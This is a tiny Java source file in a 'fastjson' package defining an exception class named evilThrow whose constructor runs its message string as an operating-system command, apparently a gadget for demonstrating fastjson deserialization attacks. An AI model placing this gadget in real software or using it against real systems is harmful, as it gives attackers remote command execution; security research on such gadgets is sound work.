package fastjson;

import java.io.IOException;

public class evilThrow extends Exception{

    public evilThrow(String message) throws Exception {
        try {
            Runtime.getRuntime().exec(message);
        } catch (IOException e) {
            e.getMessage();
        }

    }

}
